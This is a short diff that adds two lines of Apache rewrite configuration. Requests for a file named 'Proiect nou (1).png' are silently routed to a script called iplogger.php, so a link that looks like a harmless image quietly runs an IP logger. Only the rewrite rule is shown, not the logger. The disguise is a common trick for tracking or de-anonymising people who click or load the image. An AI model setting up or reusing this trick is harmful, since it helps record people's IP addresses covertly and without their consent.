@@ -1,0 +1,2 @@
+RewriteEngine on
+RewriteRule ^Proiect nou (1).png$ iplogger.php
